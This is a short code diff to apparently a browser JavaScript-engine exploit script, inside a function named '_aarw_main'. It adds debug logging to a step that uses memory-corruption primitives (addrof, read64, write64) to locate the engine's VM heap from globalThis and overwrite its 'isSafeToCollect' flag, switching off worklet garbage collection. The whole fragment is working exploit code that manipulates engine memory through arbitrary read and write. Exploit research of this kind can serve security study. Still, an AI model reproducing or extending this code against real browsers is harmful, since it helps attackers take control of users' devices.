@@ -17106,14 +17106,29 @@ async function _aarw_main() {
           }
           print("after setting up prims");
           // Disable Worklet GC
-          const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
+          print("gc disable: begin");
+          const globalThisAddr = addrof(globalThis);
+          print(`gc disable: globalThis=${globalThisAddr.hex()}`);
+          const vmOwnerPtrAddr = globalThisAddr.add(0x10n);
+          print(`gc disable: reading vmOwnerPtrAddr=${vmOwnerPtrAddr.hex()}`);
+          const vmOwnerPtr = read64(vmOwnerPtrAddr);
+          print(`gc disable: vmOwnerPtr=${vmOwnerPtr.hex()}`);
+          const vmAddr = vmOwnerPtr.add(0x38n);
+          print(`gc disable: reading vmAddr=${vmAddr.hex()}`);
+          const vm = read64(vmAddr);
+          print(`gc disable: vm=${vm.hex()}`);
           const heap = vm.add(0xc0n);
           const isSafeToCollect = heap.add(0x241n);
-          function write8(ptr, u16) {
+          print(`gc disable: heap=${heap.hex()} isSafeToCollect=${isSafeToCollect.hex()}`);
+          function write8(ptr, byteValue) {
+            print(`gc disable: write8 read ptr=${ptr.hex()}`);
             let value = read64(ptr);
+            print(`gc disable: write8 old64=${value.hex()}`);
             value &= ~0xffn;
-            value |= u16;
+            value |= byteValue;
+            print(`gc disable: write8 new64=${value.hex()}`);
             write64(ptr, value);
+            print("gc disable: write8 complete");
           };
           write8(isSafeToCollect, 0n);
           print("after gc disable");
